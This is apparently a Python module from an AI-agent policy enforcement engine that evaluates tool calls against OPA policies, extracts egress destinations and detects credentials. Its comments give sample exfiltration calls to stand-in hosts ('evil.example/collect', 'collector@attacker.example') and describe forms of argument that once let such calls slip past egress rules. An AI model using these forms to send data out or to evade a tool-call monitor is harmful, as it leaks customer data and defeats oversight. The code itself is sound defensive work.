# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors

"""OPA-style policy evaluation engine for tool calls."""

from __future__ import annotations

import asyncio
from collections import OrderedDict
import contextlib
import hashlib
import ipaddress
import json
import os
import re
import tempfile
import time
import traceback
from datetime import datetime, timezone
from typing import Awaitable
from urllib.parse import urlsplit

import structlog

from norviq.config import settings
from norviq.engine.latency import (
    PHASE_CACHE, PHASE_CANDIDATES, PHASE_OPA, PHASE_OPA_WAIT, PHASE_PERSIST, PHASE_POSTURE,
    PHASE_TRUST_COMPUTE, PHASE_TRUST_FETCH, PhaseTimer,
)
from norviq.engine.cache import RedisCache
from norviq.engine.capability import classify_tool
from norviq.engine.confusables import skeleton
from norviq.engine.inproc_cache import _MISS, TTLCache
from norviq.engine.masking import _PAN_RE, _SENSITIVE_KEYS, _SSN_RE, mask_params
from norviq.engine.graph.asset_graph import AssetGraphBuilder
from norviq.engine.graph.store import GraphStore
from norviq.engine.opa_client import OpaClient, managed_package, rewrite_package, sanitize_key
from norviq.telemetry.metrics import record_eval_phases, record_tool_call
from norviq.telemetry.spans import create_tool_call_span, enrich_span
from norviq.engine.trust import AgentHistoryStore, AgentProfileStore, TrustCalculator, TrustInput, TrustResult
from norviq.engine.trust.signals.param_entropy import ParamEntropySignal
from norviq.sdk.core.decisions import PolicyDecision
from norviq.sdk.core.events import ToolCallEvent
from norviq.sdk.core.trust import TrustScore

log = structlog.get_logger()

# Cap on concurrently-held ephemeral dry-run OPA modules (LRU-evicted past this) — bounds server
# memory + the _pushed digest map against a user dry-running arbitrary ns/class strings.
_MAX_DRYRUN_MODULES = 256
# Budget for the pre-deadline module warm. Deliberately LARGER than the 2s evaluation timeout: this is a
# one-time compile, and the whole point of warming is to keep a slow compile from being charged to a
# data-plane deadline. Bounded so a wedged OPA still degrades to the normal fail-closed path.
_MODULE_WARM_TIMEOUT_S = 10.0

# rule_id PREFIXES stamped when a would-block is SOFTENED to a logged `audit` decision — namespace
# monitor mode and per-policy audit mode respectively. Exported (not inlined into the f-strings below)
# because /audit/stats has to recognise them: a monitor namespace emits no `block` decision at all, so a
# tile counting only decision == "block" reads zero no matter how much the policy would have stopped —
# which is exactly what the Overview's "Would-block" tile did. Any new softening path MUST add its prefix
# here, or its would-blocks become invisible to the dashboard.
MONITOR_WOULD_BLOCK_PREFIX = "monitor_would_block:"
POLICY_AUDIT_WOULD_BLOCK_PREFIX = "policy_audit_would_block:"
WOULD_BLOCK_RULE_PREFIXES: tuple[str, ...] = (MONITOR_WOULD_BLOCK_PREFIX, POLICY_AUDIT_WOULD_BLOCK_PREFIX)

# Scoping primitives for positive-security (intent) policies — see _derived_input.
#
# The PAN / SSN / sensitive-key patterns are imported from engine.masking rather than restated here,
# so the request-side classifier (`derived.data_classes`) and the response-side masker cannot drift
# into disagreeing about what counts as sensitive.
# LEFT-ANCHORED ON THE RUN, not on `\b`, and that is a performance property rather than a taste.
#
# `\b[A-Za-z0-9._%+-]+@...` restarts at EVERY word character in a dotted or hyphenated run, and each
# restart re-scans the rest of the run before failing — O(n^2) in the length of ONE argument value.
# Measured on the shipped pattern: 4 KB of `a.a.a.…` cost 54 ms, 16 KB cost 212 ms, and 200 KB cost
# 33 SECONDS against a 2 s evaluator_timeout. Nothing in that payload is even hostile — a document
# body or a serialised JSON blob in a `body` argument reaches 40 KB routinely, and past ~40 KB the
# evaluation times out. A CPU-starved engine denying benign traffic is a recorded incident here
# (§G4), so this is the same defect, reached from the param surface instead of from load.
#
# The lookbehind makes each position in a run fail in O(1), so the scan is linear. It matches from the
# START of the run rather than from the first word character, which is the ONLY behavioural difference
# from `\b` — a local part may not begin with `.`, `%`, `+` or `-` (RFC 5321), so `_emails()` strips
# exactly those and the extracted address is identical. Verified equivalent over the whole test corpus.
_EMAIL_RE = re.compile(r"(?<![A-Za-z0-9._%+-])[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")
_EMAIL_LEADER = ".%+-"
_URL_RE = re.compile(r"\b[a-zA-Z][a-zA-Z0-9+.-]{1,31}://[^\s\"'<>\\]+")


def _emails(text: str) -> list[str]:
    """Addresses in `text`, lower-cased, with the leading punctuation `\\b` used to exclude removed.

    A match that is ALL leading punctuation before the `@` (`"...@acme.com"`) is not an address and is
    dropped — `\\b` never matched it either.
    """
    found: list[str] = []
    for match in _EMAIL_RE.findall(text):
        local, _, domain = match.partition("@")
        local = local.lstrip(_EMAIL_LEADER)
        if local:
            found.append(f"{local}@{domain}".lower())
    return found

# A destination written WITHOUT a scheme, which `_URL_RE` cannot see.
#
# `destinations.hosts subsetOf ["api.acme.com"]` compiles to a counted comprehension over the
# extracted hosts, and a comprehension over an EMPTY list counts zero — so a correctly-authored egress
# rule was vacuously satisfied by a call that simply omitted `https://`:
#
#     http_get({"host": "evil.example", "path": "/collect", "q": "<customer table>"})
#
# Nothing there contains `://`, so every destination list came back empty and the constraint held.
#
# ANCHORED AT BOTH ENDS on purpose. Matching a host ANYWHERE in free text would harvest hosts out of
# prose and log lines, and since these feed a `subsetOf` that direction OVER-blocks — it would refuse
# legitimate calls because someone mentioned a domain in a message body. Requiring the whole value to
# be the destination (optionally protocol-relative, optionally with a path) is the first half of
# keeping false positives down; the KEY, below, is the other half.
#
# The TLD must be alphabetic and 2+ chars, so `v1.2.3` and `report.2026` do not match. A trailing root
# dot (`evil.example.`) is stripped rather than rejected — it is the same host to DNS, and rejecting it
# left `{"host": "evil.example."}` deriving NO destination at all.
#
# SHAPE ALONE IS NOT A SIGNAL, and the first cut of this rule proved it. `evil.example`, `report.txt`,
# `object.get`, `java.lang.NullPointerException`, `john.smith` and `time.format` are all structurally
# identical, and a per-suffix denylist cannot separate them: measured over every JSON file in this repo,
# 58 of 58 values harvested by the shape-only rule were false positives (rego builtin names, tsconfig
# `lib` entries, ASGI event types) — precision 0%. These feed a `subsetOf`, so each one makes a
# LEGITIMATE call fail an egress constraint it should pass, and `destinations.hosts subsetOf [...]` —
# a rule the product tells operators to author — could not be deployed in enforce mode.
#
# The suffix denylist was also wrong in the other direction: `sh`, `so`, `md`, `py`, `rs` and `zip` are
# delegated TLDs, so `{"host": "exfil.sh", "path": "/collect"}` derived NO host and a correctly authored
# egress rule went vacuously true. The residual was worth stating and the list could not state it: any
# registrable domain under six real TLDs was silently unreachable by policy.
#
# So a schemeless value is a destination when SOMETHING IN THE CALL SAYS IT IS, never from its shape:
#   * a MARKER no filename carries — a `//` prefix, a port, or a path/query/fragment — is decisive on
#     its own, whatever key holds it and whatever it ends in (`evil.zip/collect` is a destination);
#   * otherwise the KEY has to name a network location (`host`, `url`, `endpoint`, `webhook`, … — see
#     _DESTINATION_KEY_TOKENS). A filename under a key called `host` is not a case worth trading for.
# RESIDUALS, stated in full because this is still a heuristic and the gaps belong in the threat model.
# Scheme-bearing URLs, emails, and anything with a path or port are unaffected by all three — those
# are matched from the value alone.
#   1. A bare host with no marker under a key whose name says nothing about the network
#      (`{"svc": "evil.example"}`) is not harvested.
#   2. The key is read from the value's OWN key, not an ancestor's, so `{"webhook": {"v":
#      "evil.example"}}` is missed where `{"webhook": {"url": "evil.example"}}` is not. Inheriting the
#      name down through nested objects was rejected: it would harvest `requests.auth` out of
#      `{"endpoint": {"url": …, "module": "requests.auth"}}`, which is the 0%-precision harvest again.
#      Lists DO inherit, because a list has no keys of its own.
#   3. An IPv4 written as a single decimal or hex integer (`3232235777`, `0x7f000001`) or short-form
#      (`127.1`) is not recognised. Dotted forms — including octal/zero-padded ones — are; see
#      _IP_HOST_RE. The integer forms are left out because harvesting every bare number under keys
#      like `address` and `origin` would refuse ordinary traffic (`{"destination": "us-east-1"}` is
#      already only safe because it is not number-shaped).
_BARE_HOST_RE = re.compile(
    r"^(?P<rel>//)?"                             # optional protocol-relative prefix
    r"(?P<host>(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,24})"
    r"(?P<root>\.)?"                             # optional FQDN root dot — same host, stripped below
    r"(?P<port>:\d{1,5})?"                       # optional port
    r"(?P<path>[/?#][^\s\"'<>\\]*)?$"            # optional path/query/fragment
)
# An IP literal is the most obvious way to write a schemeless destination and `_BARE_HOST_RE` can never
# match one (it requires an alphabetic TLD), so `{"host": "203.0.113.5"}` and `{"host": "[2001:db8::1]"}`
# derived nothing at all. Matched separately and normalised through `ipaddress`.
#
# The octets accept LEADING ZEROS on purpose. `{"host": "0177.0.0.1"}` is 127.0.0.1 to a glibc
# resolver, and an IP-shaped value that this pattern does not match at all is published as NO
# destination — which is the vacuous-`subsetOf` fail-open this whole module exists to close. Matching
# the shape is what lets the value be REPORTED (see _parse_bare_destination); it is deliberately not
# re-interpreted into a canonical quad, because octal and decimal readings disagree and inventing
# either would put a claim in the input document that the call never made. Bounded at `0{0,8}` rather
# than `0*`: the match is published verbatim, and an unbounded run of zeros would let one
# attacker-supplied value grow the serialised input document without limit on a 2s budget.
_IP_HOST_RE = re.compile(
    r"^(?P<rel>//)?"
    r"(?P<host>0{0,8}\d{1,3}(?:\.0{0,8}\d{1,3}){3}|\[[0-9A-Fa-f:.]{2,45}\])"
    r"(?P<port>:\d{1,5})?"
    r"(?P<path>[/?#][^\s\"'<>\\]*)?$"
)
# An UNBRACKETED IPv6 literal is how a `host` argument is normally written when it is not part of a
# URL (`{"host": "2001:db8::1", "port": 443}`), and brackets-only left that deriving nothing. Pre-
# filtered on characters and length so the confirming parse is only reached by something that could
# be an address; `12:30` and a MAC address fail the parse and fall through.
_IPV6_CHARS_RE = re.compile(r"^[0-9A-Fa-f:.]{2,45}$")
# Argument names that ASSERT a network location. Matched as whole tokens against the key split on
# non-alphanumerics and camelCase boundaries, so `webhook_url`, `targetHost` and `api_endpoint` match
# while `target_file` and `zip_path` do not. Deliberately EXCLUDES the polysemous ones — `to`, `from`,
# `target`, `path`, `file` — because `copy({"to": "b.txt"})` is ordinary traffic and harvesting `b.txt`
# as a host is precisely the over-block this set exists to avoid. Measured against the 601 distinct
# argument/key names this repo uses: 24 match, and none of them holds a filename.
_DESTINATION_KEY_TOKENS = frozenset(
    """host hosts hostname hostnames url urls uri uris endpoint endpoints domain domains fqdn netloc
       webhook webhooks callback callbacks origin origins server servers destination destinations dest
       upstream upstreams proxy proxies href link links redirect ip ips ipaddress addr address
       addresses""".split()
)
# How consequential each verb is, used ONLY to decide which of two readings of the same call survives
# when an admin's verb promotion and the payload's own evidence disagree (see _derived_input).
# Mirrors capability.source_registry._ENFORCEMENT_ORDER deliberately rather than importing it: this is
# a local tie-break over the four verbs the promotion write path already validates, and a private
# ordering from another module is not something the enforcement point should depend on. If the two
# ever diverge the consequence is bounded — a disagreeing promotion resolves the other way — so this
# cannot silently become a hole, but keep them in step.
_PROMOTION_RANK = {"unknown": -1, "read": 0, "write": 1, "send": 3, "delete": 4}
_KEY_CAMEL_RE = re.compile(r"(?<=[a-z0-9])(?=[A-Z])")
_KEY_SPLIT_RE = re.compile(r"[^A-Za-z0-9]+")
# The first structural segment of a caller-supplied key — everything before the first `.`, `[` or `]`.
_PATH_HEAD_RE = re.compile(r"[.\[\]]")


def _key_names_a_destination(key: str) -> bool:
    """True when the ARGUMENT NAME itself asserts a network location (see _DESTINATION_KEY_TOKENS)."""
    if not key:
        return False
    spaced = _KEY_CAMEL_RE.sub(" ", key)
    return any(t.lower() in _DESTINATION_KEY_TOKENS for t in _KEY_SPLIT_RE.split(spaced) if t)


def _parse_bare_destination(value: str) -> tuple[str, bool] | None:
    """`(normalised host, carries a destination MARKER)` for a schemeless destination, else None.

    The MARKER — `//`, a port, or a path/query/fragment — is what no filename carries, so it decides on
    its own. Without one the caller must supply the other half of the signal (a destination-shaped key);
    see the _BARE_HOST_RE comment for why shape alone is not a signal in either direction.
    """
    candidate = value.strip()
    if not candidate:
        return None
    literal = _IP_HOST_RE.match(candidate)
    if literal:
        text = literal.group("host")
        inner = text[1:-1] if text.startswith("[") else text
        marked = bool(literal.group("rel") or literal.group("port") or literal.group("path"))
        try:
            return str(ipaddress.ip_address(inner)).lower(), marked
        except ValueError:
            # IP-SHAPED and not a parseable address: `0177.0.0.1` (octal, and 127.0.0.1 to a glibc
            # resolver), `203.000.113.005`, `999.1.1.1`. DROPPING these was a fail-open of exactly the
            # kind this module is about — the value was published as no destination at all, so
            # `destinations.hosts subsetOf [...]` counted over an empty list and went vacuously TRUE
            # for a call whose own `host` argument named somewhere else. The literal is republished
            # VERBATIM rather than re-interpreted, because the octal and decimal readings of
            # `0177.0.0.1` disagree and asserting either would be a claim the call never made. A
            # verbatim literal is in nobody's allowlist, so the constraint fails CLOSED, which is the
            # only honest spelling of "this names a network location and I could not resolve it".
            # Still gated by the key/marker rule below the caller, so a version quad in free text is
            # untouched. Not logged: fully attacker-controlled and reached once per string in every
            # call, and per-call log spam on a 2s budget is its own denial of service.
            return inner.lower(), marked
    if ":" in candidate and _IPV6_CHARS_RE.match(candidate):
        with contextlib.suppress(ValueError):
            return str(ipaddress.ip_address(candidate)).lower(), False
    match = _BARE_HOST_RE.match(candidate)
    if not match:
        return None
    # The root dot is stripped, not treated as a marker: `norviq.custom.` is a package prefix, not a host.
    host = match.group("host").lower()
    return host, bool(match.group("rel") or match.group("port") or match.group("path"))


def _mints_a_path(key: str, siblings: dict) -> bool:
    """True when this caller-supplied KEY can assert a path some OTHER route also reaches.

    Path syntax in a key is not by itself a lie. `{"attributes": {"http.method": "GET"}}` (OpenTelemetry)
    and `{"filter[status]": "open"}` (JSON:API) are ordinary arguments, and treating their shape as
    forgery made `param_paths.attributes.http.method` — the exact path the operator saw in a dry-run —
    permanently unscopable: the derived value satisfied the pinned predicate and the rule could never
    match, for any such call.

    What makes a minted key dangerous is a SECOND ROUTE to the same path carrying a different value:

        {"message": {"toRecipients": [{"emailAddress": {"address": "collector@attacker.example"}}]},
         "message.toRecipients[0].emailAddress.address": "ops@acme.com"}

    Any honest route to a path under this object must begin with a key OF THIS OBJECT, so the second
    route exists exactly when the key's first structural segment is also a sibling key — an O(1) test
    that is precise rather than shape-based. It catches what the collision check at the leaf cannot: a
    minted `a.b` shadowing an honest `a.b[0]`, or an honest sibling whose leaf is a non-string (and so
    is never emitted as a path at all).

    A ZERO-LENGTH key is always minting. `{"": {"to": "ops@acme.com"}}` emits its children at the
    PARENT's level — `to`, not `.to` — so it forges a top-level path using none of `.`, `[` or `]`, and
    a rule pinned on `to` was answered by a value the tool never received under that name.
    """
    if key == "":
        return True
    head = _PATH_HEAD_RE.split(key, 1)[0]
    if head == key:
        return False                # no path syntax in the key: it can only name itself
    return head in siblings


def _fold_path(path: str) -> str:
    """The form in which two derived paths are INDISTINGUISHABLE to whoever reads them.

    Two keys that render identically (`café` composed vs decomposed, a Cyrillic `о` inside an otherwise
    Latin name, `To` beside `to` on a layer that case-folds) are two paths the console shows as one and
    the compiled rule label spells one way. Folded only for COLLISION DETECTION — `param_paths` still
    carries the verbatim keys, because an operator scopes against the path they saw.
    """
    return path.casefold() if path.isascii() else skeleton(path)
# Credential SHAPES, complementing masking's key-name list. Value-shape detection is what the
# key-name list cannot do: a bare AWS key pair sitting in a free-text `body` has a perfectly
# innocuous key. §11.5 recorded exactly that call being allowed on a live cluster.
_SECRET_VALUE_RE = re.compile(
    r"(?:"
    r"\b(?:AKIA|ASIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA)[0-9A-Z]{16}\b"   # AWS access key id
    r"|-----BEGIN[ A-Z]*PRIVATE KEY-----"                            # PEM private key
    r"|\bgh[pousr]_[A-Za-z0-9]{16,}\b"                               # GitHub token
    r"|\bxox[baprs]-[A-Za-z0-9-]{10,}\b"                             # Slack token
    r"|\bsk-[A-Za-z0-9]{20,}\b"                                      # OpenAI-style secret key
    r"|\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"  # JWT
    r"|\bBearer\s+[A-Za-z0-9._~+/-]{20,}={0,2}"                      # bearer credential
    r")"
)
# FROM / JOIN / INTO / UPDATE / TRUNCATE <table>. Not a parser; see _sql_tables.
_SQL_TABLE_RE = re.compile(
    r"\b(?:from|join|into|update|truncate\s+table|truncate)\s+([A-Za-z_][\w$]*(?:\.[A-Za-z_][\w$]*)?)",
    re.IGNORECASE,
)

# Rule_ids that namespace monitor (audit) mode must NOT soften — they stay hard even when a namespace
# is set to visibility-only.
#
# Monitor mode is a PROMISE: "evaluate everything, record non-compliance, interrupt nothing." An
# operator turns it on precisely because they cannot yet afford to drop traffic. This set used to also
# contain `policy_load_pending`, `evaluator_error` and `evaluator_invalid_payload`, which broke that
# promise in the worst possible way — a cold replica, an OPA fault or a malformed payload dropped
# customer traffic in a namespace whose whole configuration said "do not drop customer traffic". The
# reasoning was that those are engine-health signals rather than policy decisions and so should not be
# "monitored away". True, and beside the point: the customer is not asking us to monitor an engine
# fault, they are telling us not to break their agents. An outage in OUR engine is our problem to fix
# and our signal to raise — not a reason to take their production down. They remain loudly logged and
# distinctly attributed; they simply no longer drop the call when the namespace says not to.
#
# The two that remain are not automatic judgements about a call, which is what monitor mode governs:
#   * `trust_frozen`     — an admin explicitly froze this agent. Incident response outranks posture;
#                          an operator who froze an agent five minutes ago expects it to stay frozen.
#   * `rate_limit_exceeded` — a resource control protecting the customer's OWN backend. "Do not block
#                          on policy" is not a request for unbounded call volume. Configurable via
#                          `monitor_exempt_rate_limit` for operators who want even this to soften.
_BASE_POSTURE_EXEMPT_RULES = frozenset({"trust_frozen"})


def _posture_exempt_rules() -> frozenset[str]:
    """Rules monitor mode leaves hard, resolved per call so the setting is live-togglable."""
    if settings.monitor_exempt_rate_limit:
        return _BASE_POSTURE_EXEMPT_RULES | {"rate_limit_exceeded"}
    return _BASE_POSTURE_EXEMPT_RULES


class InvalidSpiffeIdentity(ValueError):
    """Raised when an agent's SPIFFE id fails format validation (named fallback attribution)."""


def _is_synthetic_framework(framework: str) -> bool:
    """True for traffic the product generated about itself (red-team simulation, probes).

    Kept next to its only caller rather than imported from api.synthetic: the engine must not depend on
    the API layer, and this is the framework half of that classifier, which is the stable half.
    """
    return str(framework or "").strip().lower() in {"redteam", "red-team", "policy-tester", "probe"}


class OPAEvaluator:
    """Core evaluator for policy decisions with cache-first execution."""

    _PACKAGE_RE = re.compile(r"(?m)^\s*package\s+([A-Za-z0-9_\.]+)\s*$")

    def __init__(self, cache: RedisCache) -> None:
        """Store shared cache and initialize concurrency controls."""
        self._cache = cache
        self._history = AgentHistoryStore(cache)
        self._profile = AgentProfileStore(cache)
        self._trust_calculator = TrustCalculator(cache, self._history, self._profile)
        # Per-pod L1 for the hot path's slowly-changing input reads: namespace posture (keyed by ns)
        # and the stored trust score (keyed by spiffe). Both are safe to serve slightly stale (bounded
        # by the TTL); the admin freeze/cap kill-switch is read fresh inside the trust calculator and is
        # never cached here. TTL <= 0 makes these pass-throughs (see inproc_cache.TTLCache).
        _ttl = settings.evaluator_inproc_cache_ttl_s
        self._posture_cache = TTLCache(_ttl, settings.evaluator_inproc_cache_max)
        # Admin-PROMOTED tool verbs, keyed (namespace, tool_name) -> verb. Plain dict, not a
        # TTLCache: _derived_input is SYNCHRONOUS (it runs inside _build_input on the hot path),
        # so it cannot await a Redis or Postgres read. The map is refreshed out-of-band —
        # warmed at startup and re-pulled when an admin promotes — and read synchronously here.
        # Mirrors warm_agent_overrides, which exists for the same reason on the freeze kill-switch.
        self._verb_overrides: dict[tuple[str, str], str] = {}
        self._trust_score_cache = TTLCache(_ttl, settings.evaluator_inproc_cache_max)
        # Per-pod L1 for the base POLICY DECISION (pre-override), so a warm hit skips the get_eval Redis GET
        # and the whole warm path collapses to one pipelined round trip (the fresh freeze+cap). TTL is CLAMPED
        # to redis_ttl_eval_s: a dropped policy-invalidation pub/sub event must never leave a stale decision
        # cached LONGER than the Redis eval cache's own 5s self-heal bound. Invalidated eagerly on every policy
        # event via the cache's invalidation hook (below) — freeze/cap are NOT cached here, always read fresh.
        _eval_ttl = min(_ttl, settings.redis_ttl_eval_s) if _ttl > 0 else 0
        self._inproc_eval_cache = TTLCache(_eval_ttl, settings.evaluator_inproc_cache_max)
        if hasattr(cache, "register_eval_invalidation_hook"):
            cache.register_eval_invalidation_hook(self._on_eval_invalidated)
        self._semaphore = asyncio.Semaphore(settings.evaluator_max_concurrency)
        # OPA-server client + per-key pushed-rego digests (server mode); unused in subprocess mode.
        self.opa = OpaClient()
        self._pushed: dict[str, str] = {}
        # Dry-run pushes an ephemeral `dryrun:<ns>:<cls>` OPA module per scope. Any authenticated user can
        # dry-run with arbitrary ns/class strings, so track dry-run keys in insertion order and LRU-evict past
        # a cap (delete the OPA module + drop the digest) — bounds server memory + _pushed against abuse.
        self._dryrun_keys: OrderedDict[str, None] = OrderedDict()
        self._audit_tasks: set[asyncio.Task[None]] = set()
        self._policies: dict[str, dict] = {}
        # Count PERSISTENT engine (OPA-eval) errors so evaluator_error is observable, not silent. This is
        # an engine-health signal (a transient error self-heals on retry and is NOT counted here), distinct from
        # any policy decision. Surfaced alongside the DB-derived count on /audit/stats.
        self._engine_error_count = 0
        self._loader = None
        self._graph_store: GraphStore | None = None
        self._graphs: dict[str, AssetGraphBuilder] = {}

    @property
    def graph_builder(self) -> AssetGraphBuilder:
        """Expose shared runtime asset graph builder."""
        return self.get_graph("default")

    def get_graph(self, namespace: str) -> AssetGraphBuilder:
        """Return graph builder scoped by namespace."""
        if namespace not in self._graphs:
            self._graphs[namespace] = AssetGraphBuilder(max_nodes=settings.graph_max_nodes)
        return self._graphs[namespace]

    def bind_graph_store(self, graph_store: GraphStore) -> None:
        """Bind graph store for async persistence."""
        self._graph_store = graph_store

    async def evaluate(self, event: ToolCallEvent) -> PolicyDecision:
        """Evaluate tool call against all matching policies."""
        start = time.monotonic()
        # Phase attribution alongside the existing total. See norviq/engine/latency.py for why wall-clock
        # and why this is cheap enough to leave on (sub-microsecond against a 1.4 ms floor).
        timer = PhaseTimer()
        cache_hit = False
        log.debug(
            "nrvq.eval.start",
            tool_name=event.tool_name,
            namespace=event.agent_identity.namespace,
            agent_class=event.agent_identity.agent_class,
            code="NRVQ-ENG-DEBUG-1",
        )
        span = create_tool_call_span(
            event.tool_name,
            event.agent_identity.namespace,
            event.agent_identity.agent_class,
        )
        try:
            self._validate_spiffe(event.agent_identity.spiffe_id)
            # Resolve the caller namespace's posture (enforcement_mode / trust_threshold /
            # rate_limit) ONCE per eval, per-field fallback to the global config. A namespace with no override
            # yields the global posture and byte-identical behavior. Threaded into trust (threshold), the cache-hit
            # controls (rate_limit) and the post-resolution softening (monitor mode).
            with timer.phase(PHASE_POSTURE):
                posture = await self._resolve_posture(event.agent_identity.namespace)
            with timer.phase(PHASE_TRUST_FETCH):
                trust = await self._trust(event.agent_identity.spiffe_id)
            cache_tool = self._cache_tool_key(event)
            ns = event.agent_identity.namespace
            agent_class = event.agent_identity.agent_class
            spiffe = event.agent_identity.spiffe_id
            if self._inproc_eval_cache.enabled:
                # L1+L2 warm path: check the per-pod eval L1 first, then issue exactly ONE pipelined Redis
                # round trip for the rest. On an in-proc HIT that is just the fresh freeze+cap; on a miss it is
                # the eval GET bundled with the fresh freeze+cap. The freeze/cap are read fresh every call and
                # threaded into trust as prefetched_flags — never cached — so a freeze still flips a stale
                # in-proc allow to a block via _apply_trust_overrides on the very next call.
                inproc = self._inproc_eval_cache.get((ns, agent_class, cache_tool))
                with timer.phase(PHASE_CACHE):
                    if inproc is not _MISS:
                        is_frozen, cap = await self._cache.get_agent_flags(spiffe)
                        cached = inproc
                    else:
                        cached, is_frozen, cap = await self._cache.get_eval_and_agent_flags(
                            ns, agent_class, cache_tool, spiffe
                        )
                        if cached is not None:
                            # Populate the L1 from the shared Redis decision (both hold the PRE-override base decision).
                            self._inproc_eval_cache.set((ns, agent_class, cache_tool), cached)
                with timer.phase(PHASE_TRUST_COMPUTE):
                    trust_result = await self._compute_trust(
                        event, trust, posture["trust_threshold"], prefetched_flags=(is_frozen, cap)
                    )
            else:
                with timer.phase(PHASE_TRUST_COMPUTE):
                    trust_result = await self._compute_trust(event, trust, posture["trust_threshold"])
                with timer.phase(PHASE_CACHE):
                    cached = await self._cache.get_eval(ns, agent_class, cache_tool)
            if cached is not None:
                cache_hit = True
                decision = await self._handle_cache_hit(event, cached, start, trust_result, posture)
                # Stamp the real measured end-to-end latency so the audit record reflects it (not 0.0).
                decision = decision.model_copy(update={"latency_ms": round((time.monotonic() - start) * 1000, 2)})
                with timer.phase(PHASE_PERSIST):
                    await self._persist_behavior(event, decision, trust_result)
                self._record_telemetry(event, decision, start, cache_hit, span, timer)
                return decision
            with timer.phase(PHASE_CANDIDATES):
                candidates = await self._collect_candidates(event)
            log.debug(
                "nrvq.eval.candidates",
                count=len(candidates),
                keys=[str(c["key"]) for c in candidates],
                code="NRVQ-ENG-DEBUG-2",
            )
            if not candidates:
                ns = event.agent_identity.namespace
                agent_class = event.agent_identity.agent_class
                # opa_wait is split from opa deliberately: in subprocess mode _eval_slot SERIALISES
                # `opa eval` forks, so queueing there is a prime suspect for the tail and is invisible if
                # both are lumped together. In server mode the gate is a nullcontext and this reads ~0.
                # Same pre-deadline warm as the candidate loop below; a no-op when this key has no
                # policy (the common reason there are no candidates at all).
                _direct = self._policies.get(f"{ns}:{agent_class}")
                if isinstance(_direct, dict):
                    await self._warm_module(f"{ns}:{agent_class}", str(_direct.get("rego", "")))
                async with contextlib.AsyncExitStack() as _stack:
                    with timer.phase(PHASE_OPA_WAIT):
                        await _stack.enter_async_context(self._eval_slot())
                    with timer.phase(PHASE_OPA):
                        result = await asyncio.wait_for(
                            self._evaluate_opa(
                                f"{ns}:{agent_class}", ns, agent_class, self._build_input(event, trust_result)
                            ),
                            timeout=2.0,
                        )
                base_decision = self._build_decision(result, event, trust_result, (time.monotonic() - start) * 1000)
            else:
                results = []
                for candidate in candidates:
                    log.debug(
                        "nrvq.eval.opa_call",
                        key=str(candidate["key"]),
                        rego_len=len(str(candidate["rego"])),
                        code="NRVQ-ENG-DEBUG-3",
                    )
                    # Warm the module BEFORE the evaluation deadline starts. A freshly saved or edited
                    # policy is not in OPA's store yet, and the push makes OPA recompile; leaving that
                    # inside the 2s budget blocked the first legitimate call after every policy change.
                    await self._warm_module(str(candidate["key"]), str(candidate["rego"]))
                    # Accumulates across candidates — the useful number is total OPA time for this call.
                    async with contextlib.AsyncExitStack() as _stack:
                        with timer.phase(PHASE_OPA_WAIT):
                            await _stack.enter_async_context(self._eval_slot())
                        with timer.phase(PHASE_OPA):
                            result = await asyncio.wait_for(
                                self._evaluate_single(event, str(candidate["key"]), str(candidate["rego"]), trust_result),
                                timeout=2.0,
                            )
                    log.debug(
                        "nrvq.eval.opa_result",
                        key=str(candidate["key"]),
                        result=str(result)[:200],
                        code="NRVQ-ENG-DEBUG-4",
                    )
                    results.append(
                        {
                            "decision": result,
                            "priority": int(candidate["priority"]),
                            "key": str(candidate["key"]),
                            # Propagate the provenance flag set at candidate construction — the resolver
                            # must never re-derive overlay-ness from the key string.
                            "overlay": bool(candidate.get("overlay", False)),
                            # The WINNING policy's own mode. A policy saved as enforcement_mode="audit"
                            # renders an AUDIT badge in the Catalog; without carrying it here the engine
                            # still hard-blocked, so the badge asserted something it did not do.
                            "enforcement_mode": str(candidate.get("enforcement_mode", "block")),
                        }
                    )
                winner = self._resolve_with_packs(results)
                log.debug("nrvq.eval.winner", winner=str(winner)[:200], code="NRVQ-ENG-DEBUG-5")
                base_decision = self._apply_policy_mode(winner, event.event_id)
            if (base_decision.rule_id not in settings.evaluator_non_cacheable_rules
                    and not self._depends_on_per_identity_facts(candidates)):
                await self._cache.set_eval(event.agent_identity.namespace, event.agent_identity.agent_class, cache_tool, base_decision)
                # Mirror the shared decision into the per-pod L1 under the SAME non-cacheable guard, so warm
                # replays skip the get_eval round trip. Caches only the PRE-override base decision — the fresh
                # freeze/cap + posture overrides are re-applied per call in _handle_cache_hit.
                if self._inproc_eval_cache.enabled:
                    self._inproc_eval_cache.set(
                        (event.agent_identity.namespace, event.agent_identity.agent_class, cache_tool), base_decision
                    )
            # Run the per-ns rate-limit throttle on the FRESH path too — otherwise call #1 (a cache
            # MISS) and non-cacheable allows never count against the window, and the ns-wide backstop only
            # ever engages on cache-hit replays. Same allow-only footing as the cache-hit path.
            throttled = await self._maybe_rate_limit(event, base_decision, start, posture)
            if throttled is not None:
                decision = throttled
            else:
                decision = self._apply_trust_overrides(base_decision, trust_result, event.event_id)
                decision = self._apply_posture(decision, posture, event.event_id)  # monitor mode
                decision = self._ensure_block_attribution(decision, event.event_id)
            # The multi-candidate path builds per-candidate decisions with latency_ms=0.0; stamp the real
            # measured end-to-end latency on the winning decision so every audit record carries it (AU-12/SLA).
            decision = decision.model_copy(update={"latency_ms": round((time.monotonic() - start) * 1000, 2)})
            with timer.phase(PHASE_PERSIST):
                await self._persist_behavior(event, decision, trust_result)
            self._record_telemetry(event, decision, start, cache_hit, span, timer)
            return decision
        except asyncio.TimeoutError:
            elapsed_ms = (time.monotonic() - start) * 1000
            log.error("nrvq.engine.timeout", event_id=event.event_id, elapsed_ms=elapsed_ms, code="NRVQ-ENG-2020")
            decision = await self._soften_failure_for_posture(self._timeout_decision(event, elapsed_ms), event)
            self._record_telemetry(event, decision, start, cache_hit, span, timer)
            # Register the agent on the FAIL-CLOSED path too. These three branches produce the blocks
            # that most strongly indicate an attack or an engine fault — a malformed/spoofed SPIFFE id,
            # or evaluations timing out — and none of them counted a violation or even created a
            # registry row, so an agent that ONLY ever trips them never appeared on the Agent Monitor
            # at all. Best-effort and fire-and-forget, exactly like the happy path: a registry write
            # must never turn a fail-closed block into an error.
            self._register_fail_closed(event, decision)
            return decision
